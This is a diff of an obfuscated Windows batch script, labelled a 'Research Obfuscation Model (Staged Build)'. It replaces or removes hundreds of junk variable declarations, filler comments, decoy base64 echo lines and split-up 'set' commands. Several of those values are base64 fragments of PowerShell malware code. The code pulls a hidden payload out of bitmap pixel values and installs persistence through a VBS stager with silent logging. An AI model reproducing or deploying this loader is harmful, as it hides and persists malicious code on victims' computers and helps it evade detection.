@@ -1,1540 +1,1574 @@
 @echo off
-set ADxv=
-set AHSJ=
-set AMJFw=
-set AMiIN=
-set AYKoO=
-set AYYZ=
-set Agv=
-set AiM=
-set Azs=
-set BMbg=
-set BNpU=
-set BOUK=
-set BWk=
-set Besp=
-set BfkDn=
-set BpP=
-set BuC=
-set Bvt=
-set ByyA=
-set BzdE=
-set CCMT=
-set CQKI=
-set CRf=
-set CUpz=
-set CYXem=
-set CcPX=
-set CoLqi=
-set CuagG=
-set CvQN=
-set Cya=
-set DDmLT=
-set DXm=
-set DbIio=
-set Dby=
-set DfV=
-set Dgzx=
-set DmB=
-set Drz=
-set DtE=
-set DubU=
-set DzdCt=
-set ENjDU=
-set EmNS=
-set EuQI=
-set EzY=
-set FCh=
-set FDEMl=
-set FIuY=
-set FQin=
-set FecE=
-set Fksd=
-set FooXP=
-set GEiGv=
-set GOFV=
-set GQHZ=
-set GoP=
-set Gpv=
-set HODDF=
-set HOlaa=
-set HWEd=
-set HiJ=
-set Hkj=
-set HrNSr=
-set HvcFX=
-set IGYG=
-set IIZ=
-set IhjQ=
-set Ijw=
-set Ilq=
-set JFSG=
-set JGzI=
-set JNNv=
-set JOtT=
-set JgXr=
-set JzHTa=
-set KRpLB=
-set KUDB=
-set KYflG=
-set KkYGi=
-set KpPU=
-set Kqbt=
-set KwsqG=
-set LBWa=
-set LEz=
-set LID=
-set LKglr=
-set LLK=
-set LOdV=
-set LOu=
-set LWQO=
-set Lce=
-set LdYDL=
-set Lfz=
-set LxlrJ=
-set MCo=
-set MCrJN=
-set MDA=
-set MFIXs=
-set MFe=
-set MVUXE=
-set MVd=
-set MWkO=
-set Mko=
-set Mww=
-set NWiQB=
-set NWz=
-set NXa=
-set NdSe=
-set NdSvK=
-set NiF=
-set NmGW=
-set Npsog=
-set OCBu=
-set OEL=
-set Oiua=
-set Oqg=
-set OzQBk=
-set PCe=
-set PErR=
-set PQt=
-set PTlc=
-set PUAug=
-set PmFs=
-set Pwp=
-set QAOTA=
-set QBJW=
-set QEAt=
-set QEHX=
-set QSvLN=
-set QXp=
-set QnP=
-set Qokg=
-set QsgB=
-set QtDN=
-set QwhyX=
-set QxoX=
-set RJDJt=
-set RNgf=
-set ROBN=
-set RdlUr=
-set ReVV=
-set Riw=
-set RmHJ=
-set Rvdoj=
-set SDLw=
-set SDOrv=
-set SFnLH=
-set STnj=
-set Seid=
-set SfQF=
-set SkB=
-set Skc=
-set Skt=
-set Sld=
-set SmExz=
-set SnY=
-set SyE=
-set Szc=
-set TCOEA=
-set TDJO=
-set TPV=
-set TVvX=
-set TucL=
-set TvCPj=
-set Udz=
-set UiCkM=
-set UkF=
-set UpRH=
-set UrHdU=
-set UsgNE=
-set VGKmi=
-set VXr=
-set VYc=
-set VrKAo=
-set Vzp=
-set WBdSs=
-set WCbKL=
-set WIkMF=
-set WLl=
-set WOWp=
-set WQnB=
-set WZFEO=
-set Whw=
-set WoB=
-set WqI=
-set WrEjP=
-set XCJJJ=
-set XDdk=
-set XJK=
-set XNDcd=
-set Xcb=
-set XpjB=
-set Xrc=
-set XuHBw=
-set YNdeU=
-set Yhr=
-set Yoz=
-set YrB=
-set Ytna=
-set Yug=
-set ZAESJ=
-set ZFBD=
-set ZHg=
-set ZIoh=
-set ZJF=
-set ZjpU=
-set Zkoms=
-set Zls=
-set ZvcJ=
-set aEF=
-set aIZ=
-set aLcPE=
-set aVEq=
-set aWP=
-set aZjO=
-set aZjb=
-set aay=
-set acDrA=
-set afkZ=
-set aqZd=
-set awV=
-set axim=
-set bRiCQ=
-set bUkVy=
-set bhky=
-set btVQR=
-set bwa=
-set bwfH=
-set bza=
-set cEd=
-set cPKh=
-set cdd=
-set ceZO=
-set cfYJY=
-set cfjRB=
-set cnvH=
-set dCSnC=
-set dEjoi=
-set dMvT=
-set dSDvF=
-set dSd=
-set djs=
-set dkaMN=
-set dlme=
-set dnmhq=
-set doI=
-set duTeL=
-set eDed=
-set eFe=
-set eGa=
-set eImJN=
-set eKvgq=
-set eWPV=
-set egcp=
-set eik=
-set ejljf=
-set emR=
-set fAvAa=
-set fEuW=
-set feDdH=
-set ffE=
-set fhtzw=
-set fjje=
-set gAI=
-set gHs=
-set gID=
-set gKet=
-set gOUD=
-set gdmF=
-set ghdcM=
-set gks=
-set glB=
-set hHjbe=
-set hLYP=
-set hMOyz=
-set hMVp=
-set hWpv=
-set hWyTU=
-set hZSd=
-set haMKj=
-set heUrl=
-set hkEBH=
-set hwSwm=
-set hxmJz=
-set iHAO=
-set iKpC=
-set iaDt=
-set ick=
-set idVBn=
-set idrs=
-set isY=
-set jAWyT=
-set jIt=
-set jRGof=
-set jVNWw=
-set jggp=
-set jkk=
-set jnSQ=
-set jut=
-set jxOR=
-set jzX=
-set kFr=
-set kGSY=
-set kHVlf=
-set kJATO=
-set kLqG=
-set kcZu=
-set kcf=
-set kht=
-set knY=
-set kuQx=
-set lFOHZ=
-set lFuxa=
-set lGl=
-set lLC=
-set lNIJ=
-set lVHV=
-set lXrT=
-set lwe=
-set lzQ=
-set mHbh=
-set mKvA=
-set mQf=
-set mQyzu=
-set mTE=
-set mgdJ=
-set mld=
-set mpmec=
-set nGbzi=
-set nLScm=
-set nLi=
-set nRjAB=
-set nTGK=
-set ngNDt=
-set oEKTX=
-set oEeE=
-set oSt=
-set ocIxBfHG=
-set pHwPJ=
-set pJp=
-set pLI=
-set pQGYX=
-set pVWe=
-set pWqc=
-set pfVEZ=
-set prJdo=
-set qJF=
-set qTMKa=
-set qULd=
-set qckM=
-set qjtoj=
-set qldg=
-set qoI=
-set qxaUd=
-set rBlW=
-set rEmp=
-set rHyn=
-set rRC=
-set rYR=
-set rcy=
-set rjK=
-set rkZ=
-set rvob=
-set rwHBI=
-set sAa=
-set sEf=
-set sKyQ=
-set sqBSG=
-set ssp=
-set tIAC=
-set tKrn=
-set tNX=
-set tUqD=
-set tauTN=
-set tclIU=
-set tfMi=
-set tnG=
-set toz=
-set tuF=
-set twHB=
-set tzTU=
-set uApn=
-set uCZeA=
-set uPCC=
-set uWLC=
-set uXXK=
-set uZRg=
-set uarC=
-set uetQQ=
-set umaTK=
-set uubEU=
-set vAt=
-set vCb=
-set vGYpu=
-set vTYg=
-set vVaJF=
-set vcO=
-set vfMYU=
-set wAxu=
-set wBh=
-set wHsn=
-set wQBJs=
-set wWG=
-set watII=
-set wmypn=
-set wrWMU=
-set wwo=
-set xKBv=
-set xOz=
-set xQe=
-set xRuHe=
-set xUuJr=
-set xdh=
-set xhy=
-set xmHxW=
-set xmUJH=
-set xqmB=
-set xqv=
-set xsB=
-set yYKVL=
-set yaNin=
-set ykQTk=
-set ylYP=
-set yrMdt=
-set ysppW=
-set ywAgh=
-set zAZ=
-set zFxD=
-set zXwW=
-set zfdDr=
-set zkvT=
-set zxR=
+set AOLkv=
+set ARe=
+set AhMG=
+set AqBt=
+set AsRpM=
+set AxS=
+set BNYJZ=
+set BUyZg=
+set BWW=
+set BWd=
+set BXr=
+set Bcn=
+set Bexv=
+set BfB=
+set Bfad=
+set BjynG=
+set CGIO=
+set CHj=
+set CKY=
+set Cbl=
+set Cpu=
+set DWkXS=
+set DdRy=
+set DsTP=
+set Dsii=
+set EBIX=
+set ECro=
+set EFV=
+set EHd=
+set EQKw=
+set ETud=
+set EaLNe=
+set EaTN=
+set EdnPD=
+set Egg=
+set EhRZX=
+set ElfhV=
+set EqeK=
+set EyRI=
+set FDBQt=
+set FLpA=
+set FVXI=
+set FWQ=
+set FXiC=
+set FdQ=
+set FfZ=
+set FpJZ=
+set FvA=
+set GAuNR=
+set GKA=
+set GMbp=
+set GOd=
+set GWfNs=
+set GeouF=
+set GfdA=
+set GwEDN=
+set Gxmyn=
+set HCu=
+set HPDIZ=
+set HsCm=
+set ILAtj=
+set ISnWd=
+set IkSG=
+set Iqq=
+set JMG=
+set JMl=
+set JXgjh=
+set JlL=
+set JmZh=
+set JpLR=
+set JvqBP=
+set KBtoU=
+set KFZq=
+set KIH=
+set KRZ=
+set KWl=
+set KYaJ=
+set KioQu=
+set KrV=
+set Kuy=
+set KxiE=
+set LBz=
+set LEH=
+set LQpik=
+set LWxvy=
+set LXC=
+set LeX=
+set LxRJ=
+set Lzf=
+set MKmPD=
+set MLc=
+set MPMqT=
+set MSWVa=
+set MmUbN=
+set Mwdjz=
+set NDEU=
+set NYCl=
+set Nor=
+set OPMw=
+set OSd=
+set OSpAg=
+set OVzW=
+set OrAy=
+set OwG=
+set PMG=
+set PPfJw=
+set PRTIO=
+set PST=
+set PeDlu=
+set PhzOnkOoQNn=
+set Pok=
+set Pru=
+set Prx=
+set Ptjk=
+set PuNOd=
+set PvauV=
+set PxH=
+set QFeLr=
+set QIUYx=
+set QKz=
+set QNpCm=
+set QRnLi=
+set QVYYg=
+set QWB=
+set QXMbB=
+set QeDI=
+set QiSMf=
+set Qpoh=
+set Qwob=
+set RHiH=
+set RQOot=
+set RUckM=
+set RdgU=
+set RhkqB=
+set RsJlJ=
+set Rtl=
+set RvRR=
+set RzCp=
+set SBGu=
+set SBnIb=
+set SFxLv=
+set SHD=
+set SQHf=
+set SSFH=
+set SSeo=
+set SYXO=
+set SdUX=
+set SiAE=
+set Siv=
+set SktUv=
+set SoVh=
+set Spp=
+set Ssj=
+set Svyu=
+set TPDI=
+set Tblnw=
+set TcDVE=
+set TcLG=
+set Tgiyl=
+set TheAK=
+set TrKcH=
+set TsnD=
+set Ttf=
+set Twds=
+set UDGQV=
+set UEiMr=
+set UEpX=
+set UGSZA=
+set UJD=
+set ULWaR=
+set UPS=
+set UQrY=
+set UWul=
+set UXI=
+set UpDi=
+set UqNA=
+set VKLCr=
+set VXy=
+set VYRMa=
+set VcrTd=
+set VgqoL=
+set VheST=
+set VufNw=
+set Vuxd=
+set VyWS=
+set Vyb=
+set VzIzx=
+set WMs=
+set WPNb=
+set WRVU=
+set WTY=
+set WUch=
+set WdcP=
+set WhS=
+set WrR=
+set XAYh=
+set XJtuo=
+set XSws=
+set XXjL=
+set XaF=
+set XiC=
+set Xpk=
+set XwGT=
+set Xzh=
+set YJBsf=
+set YJk=
+set YMwxf=
+set YZzBo=
+set YisQQ=
+set YtN=
+set Ytml=
+set YyQ=
+set YzZt=
+set ZDz=
+set ZNsF=
+set ZOvr=
+set ZUA=
+set ZUck=
+set ZXqEs=
+set Zfi=
+set ZgAOA=
+set Zkza=
+set ZlXz=
+set ZsnH=
+set aEKH=
+set aVACP=
+set abbRr=
+set afy=
+set akWmB=
+set aqpVQ=
+set arMmo=
+set aye=
+set bCrr=
+set bDO=
+set bIog=
+set bSIUl=
+set beFA=
+set cYduW=
+set cZS=
+set ccFIe=
+set cgy=
+set cluOK=
+set cqSD=
+set cxM=
+set dHBsY=
+set dIFG=
+set dLv=
+set dPT=
+set dUM=
+set dUyC=
+set dbh=
+set dbqKA=
+set dfV=
+set djqIM=
+set dmNC=
+set dpnZg=
+set dwAq=
+set eDhX=
+set eYhM=
+set eZTTT=
+set ebIK=
+set efyt=
+set eiT=
+set eoRIS=
+set eoSn=
+set eqDZR=
+set euf=
+set eygl=
+set fCHTZ=
+set fLxYE=
+set fNBt=
+set fOW=
+set fOwIj=
+set fgIVl=
+set fmLan=
+set fwXHD=
+set gBrNF=
+set gPDv=
+set gaT=
+set gst=
+set gueXn=
+set gve=
+set hFIO=
+set haZF=
+set hhF=
+set hpWLz=
+set iJUJa=
+set iKao=
+set iLy=
+set idQk=
+set iji=
+set insps=
+set iuBP=
+set iyAzZ=
+set izLb=
+set jAv=
+set jBz=
+set jDdL=
+set jHuJV=
+set jKMDe=
+set jLYZ=
+set jOS=
+set jOf=
+set jUxF=
+set jYP=
+set jbtsR=
+set jhFP=
+set jxIno=
+set jyE=
+set kAlzr=
+set kLv=
+set kPQ=
+set kTh=
+set kVSRq=
+set kWI=
+set kZOHe=
+set kxJsF=
+set lKb=
+set lRAOY=
+set lRY=
+set lTw=
+set laE=
+set lbEq=
+set lgtmu=
+set lxaT=
+set mEs=
+set mHDK=
+set mOC=
+set mSSx=
+set maNXP=
+set mdRfE=
+set mgOQD=
+set mms=
+set mym=
+set nCBK=
+set nJAg=
+set nKYw=
+set nWWNI=
+set nXbh=
+set nfYaY=
+set ngwOo=
+set nhk=
+set nhwe=
+set njFE=
+set nlFT=
+set npkRd=
+set nrmkM=
+set oAtcz=
+set oINx=
+set oUtYE=
+set ocDzk=
+set omfPc=
+set onldn=
+set oseJK=
+set pHNr=
+set pLu=
+set pNl=
+set pOS=
+set pXUyP=
+set pbhQ=
+set pfssZ=
+set ppm=
+set pyFq=
+set qfYM=
+set qtRLU=
+set rDi=
+set rFs=
+set rPz=
+set rQU=
+set rgb=
+set roEQN=
+set rtAYL=
+set rwg=
+set sDD=
+set sKL=
+set sNQ=
+set sPhe=
+set sTn=
+set saXiw=
+set sbis=
+set sgKrx=
+set skzSF=
+set svJv=
+set syg=
+set tHdY=
+set tLNCf=
+set tQFa=
+set tSEAA=
+set tSL=
+set tWwbX=
+set tXy=
+set tec=
+set tzoDx=
+set uGEnZ=
+set uGg=
+set uJv=
+set ubpN=
+set ufrCV=
+set ugtFq=
+set umVve=
+set unMpL=
+set uwSG=
+set uxUwZ=
+set vEc=
+set vYE=
+set vghb=
+set vpGJM=
+set vqO=
+set vqxpe=
+set vvBkN=
+set vvSjy=
+set vylU=
+set vzlm=
+set wEl=
+set wViF=
+set wVud=
+set wbb=
+set wgyHr=
+set wnV=
+set wwegU=
+set xBulb=
+set xahZ=
+set xeTT=
+set xkk=
+set xkuK=
+set xlGT=
+set xwq=
+set yCU=
+set yNcF=
+set yORg=
+set yQVBz=
+set yRbhO=
+set ycnza=
+set yfMq=
+set ypgt=
+set ypumI=
+set yzLX=
+set zKbG=
+set zRIkS=
+set zUZV=
+set zUf=
+set zVLji=
+set zWS=
+set zab=
+set zjDLw=
+set zjrf=
+set zmoY=
+set zpGx=
+set zsXs=
+set ztVWr=
 
 REM --- Research Obfuscation Model (Staged Build) ---
-se%DmB%T "XaWQXdVQgdKHan=RyuRENyattGmXsHhTxvAqYfsnpVoW"
-se%hHjbe%t "dwcDbhW=shekVaZMWQpRClZBojyyvMYNmekFagd"
-REM vision ruby twilight zenith
-REM fragment clearing vertex
-REM clearing core valley
-REM core sword mirage phantom vision odyssey delta beacon
-sE%sEf%T "QVfrjJBuUTq=apWLKeGpgLFHObuBoKTA"
-se%Hkj%t "wkJAuL=saYalBameofSpYMNtlFb"
-REM core shadow zenith cipher twilight undergrowth guard core echo
-REM phantom lance ruby fragment core strobe hawk core
-sE%TPV%t "HeurakDTGr=DnJtyORpdnieRWMtO"
-REM vertex odyssey sword
-echo d3pBT1ZVdnV3dVEzdVdGOVpDRmRMWGZRVTBtVlBXRTBQbEZTdjhTWDFEOXZxcktOTg== >nul 2>&1
-se%CUpz%t "RExbypJqAcdq=OXJqZbsmotjUFaVRrrZILzPPsiQKxsNwFEF"
-REM zenith beacon delta
-echo ajhDMmd0d1J5WVhOV0owVUdHWVBvc1I5bzU2TGcyQVNOTHBud0xjR0l2c0U4NkFqaHVPdjI= >nul 2>&1
-REM glimmer mirage shadow circle clearing echo shadow hawk
-REM vision sword pixel glimmer fragment lance shadow odyssey zenith shadow
-se%ZJF%t "VyjmgYSfdOaFus=KWoEVGAWBufbaduVkoDsBoXiLwIHElz"
-Se%isY%T "FAupyfPq=BdHDbfAJIAAVLZQJfEkLQRMIIn"
-echo ZDZHTU9CU3hWRFlsMTRYWkJ5OExSdk80QzdBWjgwZ3FTbndLVEVsWGZtSW9ySHA3WnBrTVo2bXZ0dE81U0s= >nul 2>&1
-echo UnNPdzJNdkJTUXRsdUxCOWZ2bE91TGg1NWNQZ3FpYjVzRmZSYnZ4bUpFSVBpaFZ1bDF3elFW >nul 2>&1
-REM beacon shadow guard vertex lance vision echo undergrowth kappa echo
-echo UXRVdzdMVUpsYUs5YjdsQmZzR1lGRjRsdnJMMmhZNHdjQ0hDZTduUTduQXJnOHBwQVc4MVY1bTByZDAx >nul 2>&1
-REM cipher kappa core cipher twilight binary lance sword undergrowth
-REM delta sword shadow ruby hawk pixel
-SE%lNIJ%t "KFaFrkRhWfvA=LZDQjclgYVvnRRpbUgN"
-echo ME9ydTZuTnA3T2pEbnB0d0ZYT1hDMndIUm1LSlQ1b3FveEJsdEpLM0JTTjZRV000NG82NFNXSEhY >nul 2>&1
-echo UWtPRHR4ckJUaDZndnRKcTd2NVhBSTJwbmFYZGd6RmVDSllzV2NIV1RPUW1YWA== >nul 2>&1
-echo ODI2cjE2ODdrb0pSbHNGczZrREF5Ynd1Uk0xV2xnMnVhN1VSYkVLSFRkejQxeXQ3RXNiQjVMZm9ScnFvNkRUSzlmb1VCQnd4 >nul 2>&1
-REM kiln guard core kappa delta twilight vision binary shadow twilight
-echo eHBmUG9xOHUwa05yS2V4T2NhMndFbUVEM0xJOE1jQ2Fla1FYTWUwU0FGckFWZ2R3Z1pBb011NUhhWllF >nul 2>&1
-Se%feDdH%T "WPKSvAJoqddaJg=FvXCAzWxFWKQQMteqlRANHH"
-se%bRiCQ%t "rWGdXvYa=rpvXBdQolIpaeaLIlpySsBiRDLUPRuGqASV"
-REM binary mirage kappa mirage hawk undergrowth guard delta fathom strobe
-sE%Cya%T "izimNHHVaxQJI=SophHAyLuXhSSaLPgTCtKIEkbKrJDKJgK"
-REM clearing circle valley pixel mirage zenith phantom mirage cipher
-se%kht%T "GrYHyvzeZRaqt=gJyvEUpXzAvdRnncqvsCmTaifhGB"
-REM fragment sword binary odyssey kiln undergrowth
-sE%ENjDU%t "KWgbxndjPaUJXbQ=rBMMWfZAHBDOWsoEpNGingv"
-sE%eKvgq%T "uTVdCaxrzPu=gSFxaZPmKcjwoqX"
-REM ruby shadow delta cipher kappa
-SE%jVNWw%t "LloLnioMnTuzh=lLHKKvPpKAtKOeTzKclpuurvUiWVAfX"
-SE%eDed%T "TkEqWRTIBzW=TFlUiNsmmcqycJALelppC"
-REM pixel delta delta mirage undergrowth
-SE%Xcb%t "VwWpRA=KrRnhhTIZCgKdXMxWmOFkHAvDyaCDtV"
-echo aHB0NjFBaEpiR3pCdmVEQ3JBZjZ5NEE0Rkdaalh5T0wzeDdJaXlsY2NJYUFKdmdjRTJOaUl6Mk1uemgydGhjbg== >nul 2>&1
-REM ruby glimmer shadow pixel hawk
-SE%WOWp%T "ySoGNiqoZzVR=GYykgaRKQUieGgxnIfHlTXwnAGl"
-REM odyssey zenith sword beacon shadow
-REM circle echo shadow mirage echo
-sE%NdSe%T "WMZmTsDLkQErwt=eCNFPqCtfBMtjtofqmrg"
-SE%UrHdU%T "bodcXAxCiCY=NrltNKPWWoFcggiURRKoDvce"
-Se%KpPU%t "RvjpCIsQaErX=MCkKJGxlbmd0aCA9IChbdWludDMyXSRwMC5SIC1zaGwgMjQpIC1ib3IgKFt1aW50MzJdJHAwLkcgLXNobCAxNikgLWJvciAoW3VpbnQzMl0kcDAuQiAtc2hsIDgpIC1ib3IgW3VpbnQzMl0kcDEuUgpMb2ctU2ls"
-REM ruby kiln lance core
-REM delta clearing hawk beacon
-REM odyssey fragment fragment
-REM guard vision beacon fragment
-REM undergrowth guard vision lance sword ruby pixel
-sE%tUqD%t "WOOqzqDR=asohaBWEsUysaztiOG"
-se%WqI%T "TajCqgJEVWuRn=uwttHCKAwokhecHkj"
-REM kiln shadow lance fragment circle
-echo UlEyZ2RRVDZTNVVoS2d0UVFLdDZwYjBlMmVOaFRrc2NwVk01NnNVNkVSQUNETFVhVmlNTQ== >nul 2>&1
-SE%xUuJr%t "FeYnfyvyHtRAyIV=WkeXWusmFGUtuAYdspu"
-REM phantom valley cipher twilight twilight
-REM valley sword odyssey delta shadow shadow binary clearing
-echo MklIeW5uMzVWT1pJUGQwT1BTMndwVENaeHhSZmd4T1BFcldkd2l4UDdESkdlRTA1N004SjFPamph >nul 2>&1
-se%SnY%t "ABznPuWWQRYkXf=KBkFlzyVZnncJspLoazryTTCN"
-REM kappa twilight hawk pixel strobe
-echo THdDTFJnb3FOUVpMTWpRVGd0ZG04WGJEOWZRTEhjRnpJWHp4cUJKWmJYU1V5Z3dVM3Z6SjZkbQ== >nul 2>&1
-REM hawk kappa sword pixel ruby kiln valley phantom undergrowth
-SE%mpmec%t "TihSmPRxIceW=gJHRydWU7IGJyZWFrIH0KJGV4dHJhY3RlZC5BZGQoJHB4LkcpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9CiRleHRyYWN0ZWQuQWRkKCRweC5CKTsga"
-echo YjlJQlgwV1RTVEpxV3FoaURWMEdJbEp2TVFNRFFzN2h5RTNzU3BxRzJESXVITzZoWU9IREM3MVlGMw== >nul 2>&1
-REM fragment cipher undergrowth vision
-REM kappa odyssey beacon sword odyssey strobe
-REM ruby clearing vertex delta ruby sword
-REM twilight mirage pixel binary fragment lance pixel guard
-REM clearing hawk shadow valley kiln guard hawk binary lance zenith
-echo SG1mTVdBRHZkWDk0U3E3cUppRUEzeFI3VXBrM1RsNGNYeGdQZHpLS2RReDRsRWkxdDQyNGduak5xUmdtZTI1RVd1MGJqSFJFYkQ= >nul 2>&1
-SE%pfVEZ%t "VQNpMENVrJY=bnebcucHGOKBXyPpBle"
-echo UWhYU0d3UzNnZzdIRWhyNnZkR2FnYTVkc3YwVkhNSzV2ampJVFJHcEJFWXN6QlZxb1ROY3NVNW4wS2FGNU5kcFJuUG1ZOHJmVHJo >nul 2>&1
-SE%aEF%T "HMuxyNeZEaYqUdx=iDmlSjNoqZEWOASJkHObPmxTFgIgNSJXIHm"
-REM pixel shadow beacon binary vision strobe beacon binary
-SE%Riw%T "FRNDwNm=LTBrxlGuGvWrzAmBALvTzsotZupUga"
-REM phantom pixel shadow valley echo cipher
-echo WmVoUkZ5MVZjbjVpMHVCbUkxV3AyMjR3cG5zdGluRWZKUnphdzIySA== >nul 2>&1
-sE%oEeE%T "udjDqgoUb=IhqYsmcXtUziydN"
-echo VFI0WkRDQVpiYnNWZDBIaUpqVnN4cElrZ0JQUnJuR0NGems0NUxFZG9IS010cXF0TQ== >nul 2>&1
-sE%JNNv%T "NgKPQZMwPD=KsSUqAsXIiQGBAbS"
-Se%tKrn%t "IioLlN=H0KZWxzZSB7IFdyaXRlLUhvc3QgJE1lc3NhZ2UgLUZvcmVncm91bmRDb2xvciAkQ29sb3IgfQp9Cn0KZnVuY3Rpb24gSW5zdGFsbC1QZXJzaXN0ZW5jZSB7CnBhcmFtIChbc3RyaW5nXSRTdGFnZXJ"
-sE%SfQF%T "cPifrYmDkTdGMw=cQtdhkmKrngSAqEOmWj"
-echo VW5lbEJaNE1nRDQwc05oWWwyREhpRUNMVXlOUUxHanVaWFpwcUl1SEZiYjdhQnpTckNFbDBGN1ZY >nul 2>&1
-sE%QSvLN%T "ySXUofXgPkVPLY=qZddnLAMnopgijQvqWilsIqxKcli"
-REM clearing twilight zenith hawk clearing lance vision binary zenith clearing
-se%ejljf%T "TeiHjEVD=ndJYsWYvEZUDTBeGQFXOqJVkOZlHG"
-echo cWw4UzZ1MHN5bWNzRER6RHBLRGJsQnRWZmxjU1BndFoyR2lZZTBhNmJTMVJKTVJzcjhNU0djQnA1 >nul 2>&1
-REM zenith core twilight ruby fathom undergrowth guard kiln sword
-REM strobe vision fragment binary cipher ruby
-REM pixel binary clearing undergrowth ruby kiln beacon
-echo WTExbE5aQVFkSGxORjF2S0ZHenYxdFN0ejFtd1Z3YzE5Vlp3TXlUaVdobWpPcldxUExVMG0wVVNCeUV0cFNJalc= >nul 2>&1
-REM circle phantom pixel clearing kiln mirage undergrowth ruby kappa
-echo STdWTEhuREpzREJiTHVkVmxMbzg1cWM5azZTNlEzc3hsYVQ4UzVMMExobmNsUU9l >nul 2>&1
-REM sword vision mirage
-REM twilight echo lance vertex binary hawk clearing mirage strobe kappa
-REM binary undergrowth valley
-echo bUtzT0J5UnlOTFVpdFV5Q0l1OEMyT2xJS0ZSR2txaXdIZGVUMW9wbFBSRFNLeUxrQmdWOTNRNHRzaDI5 >nul 2>&1
-REM glimmer delta delta guard sword kappa phantom mirage
-REM cipher zenith sword vision fathom kiln twilight guard core mirage
-echo MlIwTDFPZ3JiYjBiVTFyRnpZVHdHejZzT0R6bFV4ZFhBRUtoeGVKRWY1VFMwV2ZKbA== >nul 2>&1
-SE%XNDcd%t "RzHjtqly=AsfOOilqbBWnWMi"
-REM hawk zenith glimmer glimmer glimmer beacon ruby shadow
-echo cnpaU0NmSWVFZXhBbkQxZnRKSlJjNlFDcllHbzhGZXl6Y25ZbkI5WFNXemJUbGJoT3RwVWFIMEZpVDFSWTFvM3p0Ng== >nul 2>&1
-sE%WZFEO%T "JLlNLTfszvij=jsBkdXqHzYNIkDvQMsMwqNcOilzUV"
-se%dMvT%T "VGfUyMYJ=tzdHJpbmddJENvbG9yID0gIldoaXRlIiwgW2Jvb2xdJElzRXJyb3IgPSAkZmFsc2UpCmlmICgtbm90ICRTaWxlbnQpIHsKaWYgKCRJc0Vycm9yKSB7IFdyaXRlLUVycm9yICRNZXNzYWdlI"
-echo clk4ZGoxMkRoOXlTeVp0UWxOc0Z3UGl5MEFHa0E3Mk5RMktHYkFmVzVPMWtGN1BnalBSb3E= >nul 2>&1
-sE%mTE%T "NYFtQJBOTAVLri=brjWYDHuPBZpKHBnHuDVcVWDF"
-Se%gHs%t "ASSOFADITbQLZP=PNGJUtdjMndmXofMa"
-SE%gID%T "KErYfUDiuio=JGJtcCA9IFtTeXN0ZW0uRHJhd2luZy5CaXRtYXBdOjpGcm9tU3RyZWFtKCRtcykKJHcgPSAkYm1wLldpZHRoCiRoID0gJGJtcC5IZWlnaHQKJHAwID0gJGJtcC5HZXRQaXhlbCgwLDApOyAkcDEgPSAkYm1wLkdldFBpeGVsKDEs"
-Se%KYflG%t "kqRSqvggeIhx=XIyrLCXdCujEwLwWjX"
-echo QWRMWXVxWGNmZnVYTUlJeHMxdWVNMkxhYjVTSzNsM3BvaUxONkJvSEJXNFlmcGhSV0RiTmljMGRTZnM3Z2VZZ1NTR2JhWXMwelFIekY= >nul 2>&1
-se%bUkVy%T "havGRhxK=3RlbmNlIGluc3RhbGxlZCB0bzogJHZic1BhdGgiICJHcmVlbiIKfSBjYXRjaCB7CkxvZy1TaWxlbnQgIkZhaWxlZCB0byBpbnN0YWxsIHBlcnNpc3RlbmNlOiAkKCRfLkV4Y2VwdGlvbi5N"
-se%ffE%t "jAGCvLhXL=PxZakcBposalwIYnYfSUukStsWCVefPpatI"
-Se%iKpC%T "JLRTpYANcelXEE=fthhXaGwYcMNGGDYMYiGmPgIDd"
-SE%bwfH%t "BZHfpkzasK=AifQFIkQFlpwaolgWBlwwAtgiJiBrW"
-echo VDIySFh0UU5xRk5XWFlUeEt1RGowM291akpQWEtnSkJWclhUN096bmNYcWdwQkpH >nul 2>&1
-echo U2FXdEw2NG9SeFFCN1JNclk4UzVlSXphTzVvYkoxSGk3aGN5UWNyT3dHY0xVQw== >nul 2>&1
-echo UVV0a2hMZkxQT1VQMk1jZUMzdWw4U0hoSFp0ZkdORFBPbGZVR3JKQnJlbHdi >nul 2>&1
-echo MTNsazBiNU9NN0RBQlFSRUFDUklPSDNIYmM0V2NPZ011RkJIc0piWXkyd0t4ZjdPNjdiUk5pVGRGSWp4aGRpWGpSdTZESDNjQk1uMTd5VEw= >nul 2>&1
-REM kiln sword delta pixel phantom circle clearing pixel twilight kiln
-sE%hZSd%t "khMqgc=zdMvgdhLhbdwKeYjCJZeprbErgipbPEP"
-REM shadow shadow binary vertex delta echo sword
-REM undergrowth beacon undergrowth phantom shadow phantom
-se%IhjQ%t "GZOArfkk=qfpfYvTUxK"
-sE%fAvAa%T "PhilqBRkzKcOyF=GSyyJNgulqTwysqo"
-REM core delta hawk pixel hawk lance phantom valley strobe
-sE%VYc%T "fplAhUU=fHxLLKAByWnOYEuvZKsopEQgjjsjC"
-echo bzNSRkRWcXlKVHc0cUozNDd1WktyN0ZQQzlqbGQ0Wmk4aXk5ejJOaw== >nul 2>&1
-REM hawk vision vertex fragment undergrowth cipher cipher fathom odyssey
-se%WBdSs%T "VdiMvsPCYGvCvH=zuxtEhgfTzlgbxVqLdnXPIZmkfdnmICXGQl"
-Se%LKglr%t "meuLhobdCsHcfhJ=kCoEAvAMELRjAnbkZzCVTGEXebq"
-se%awV%T "RpsPoJZ=UtJTNIvAKPxEQapbbJPjhTDpQXSZVFPa"
-echo SURya1p2Zkx5UHRqbUtmVE5GaEF4U09xQzBGNWxOUlVXNzM0Z0tEbmZDcXcyZ3VwRTJDTFU= >nul 2>&1
-REM strobe kiln valley lance phantom twilight pixel
-REM vertex delta beacon undergrowth undergrowth circle cipher
-REM phantom zenith core twilight circle clearing guard core
-REM core mirage vertex kappa pixel glimmer
-SE%WLl%t "eHVvfK=FwmfFBueGdvYZgIpn"
-SE%uApn%t "PViEHmiWS=aYsyHnpekLIUiGMBNY"
-sE%Pwp%t "cvoftPgHVG=LcTdRVFXUN"
-se%Zkoms%T "mgHbFaWIXxYP=gkrUqxiGcE"
-REM fathom vertex glimmer beacon
-sE%CuagG%t "JdFMKzoUYAhxGMV=SBWYHGXDlzZXCITzjw"
-REM valley mirage pixel
-SE%MVd%t "pctFwrfekxgrffb=bBYYXmSBBtMwovPARTlCJxH"
-echo d2FBOG5vSmxkc2N2SGkwNHIycnNpWDR0cGFoUUtYNUplemVhU2JMOEdlRW9YbDlNNDVsdmlVbEJGZmJaRTBrMmFoUEJ4bWtI >nul 2>&1
-sE%pWqc%T "zxPdPaNaomydWyR=xAMXoEmpChnkdzjJJa"
